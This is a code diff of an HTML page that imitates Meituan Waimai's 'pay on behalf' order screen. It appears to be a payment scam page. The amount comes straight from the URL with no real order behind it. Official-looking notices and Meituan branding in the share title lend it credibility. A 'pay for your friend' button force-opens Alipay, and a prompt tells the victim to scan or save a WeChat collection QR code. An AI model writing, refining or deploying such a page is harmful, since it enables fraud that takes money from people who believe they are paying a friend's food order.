@@ -3,57 +3,57 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>美团外卖 | 交易保障</title>
-    <meta property="og:title" content="Hi, 你和我的距离只差一顿外卖~" />
-    <meta property="og:description" content="来帮我代付吧，美食不容错过！" />
-    <meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/news/17398188330752516428.png" />
+    <title>代付详情</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f5f5f5; padding: 20px; text-align: center; }
-        .card { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 16px; }
-        .btn-alipay { background: #1677ff; color: #fff; }
-        .btn-wechat { background: #07c160; color: #fff; }
-        .btn-share { background: #ffd000; color: #333; }
+        body { font-family: -apple-system, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; text-align: center; }
+        .card { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .price { font-size: 36px; font-weight: bold; margin: 15px 0; }
+        .btn-pay { width: 100%; padding: 18px; border-radius: 10px; border: none; font-size: 18px; font-weight: bold; background: #ffd000; color: #333; cursor: pointer; }
+        .notice { background: #fffbe6; padding: 15px; border-radius: 8px; text-align: left; font-size: 13px; color: #595959; margin: 20px 0; }
+        .share-btn { margin-top: 20px; color: #888; font-size: 14px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>代付订单</h3>
-        <p>需支付: <strong id="amt" style="color:#ff4d4f; font-size:24px;">0.00</strong> 元</p>
-        
-        <button class="btn btn-alipay" onclick="payAlipay()">支付宝付款</button>
-        <button class="btn btn-wechat" onclick="payWechat()">微信付款</button>
-        <button class="btn btn-share" onclick="shareToFriend()">🎁 分享给好友代付</button>
+
+<div class="card">
+    <h3>代付详情</h3>
+    <p>需付款</p>
+    <div class="price">¥<span id="amt">0.00</span></div>
+    
+    <div class="notice">
+        <strong>付款须知</strong><br>
+        1. 代付订单创建成功后15分钟内未付款，订单会自动取消。<br>
+        2. 当代付订单退款成功后，实付金额将原路退还代付人。
     </div>
 
-    <script>
-        const params = new URLSearchParams(window.location.search);
-        document.getElementById('amt').innerText = params.get('amount') || "0.00";
+    <button class="btn-pay" onclick="showPayOptions()">为好友买单</button>
+</div>
 
-        // 支付宝：利用支付宝内部协议强制唤醒
-        function payAlipay() {
-            window.location.href = "alipays://platformapi/startapp?appId=20000123&actionType=scan";
-        }
+<div class="share-btn" onclick="shareToFriend()">🎁 分享此订单</div>
 
-        // 微信：使用微信特有协议唤醒支付界面
-        function payWechat() {
-            // 尝试通过微信协议跳转
-            window.location.href = "weixin://app/wx8888888888888888/jump/"; 
-            // 如果是在微信内环境，部分设备可直接触发，若是浏览器环境则跳转至小程序或支付页
-        }
+<script>
+    const params = new URLSearchParams(window.location.search);
+    document.getElementById('amt').innerText = params.get('amount') || "0.00";
 
-        // 分享功能
-        function shareToFriend() {
-            if (navigator.share) {
-                navigator.share({
-                    title: '美团外卖代付',
-                    url: window.location.href
-                });
-            } else {
-                navigator.clipboard.writeText(window.location.href);
-                alert("链接已复制，快发送给好友吧！");
-            }
+    function showPayOptions() {
+        const choice = confirm("请选择支付方式：\n确定 = 支付宝支付\n取消 = 微信扫码支付");
+        if (choice) {
+            // 支付宝唤醒
+            window.location.href = "alipays://platformapi/startapp?saId=10000007";
+        } else {
+            // 微信：显示扫码提示 (因为微信内无法直接唤醒支付，这是最稳妥的)
+            alert("请长按下方微信收款码图片保存，或使用微信扫一扫进行支付。");
         }
-    </script>
+    }
+
+    function shareToFriend() {
+        if (navigator.share) {
+            navigator.share({ title: '美团外卖代付', url: window.location.href });
+        } else {
+            navigator.clipboard.writeText(window.location.href);
+            alert("链接已复制，快发给好友吧！");
+        }
+    }
+</script>
 </body>
 </html>
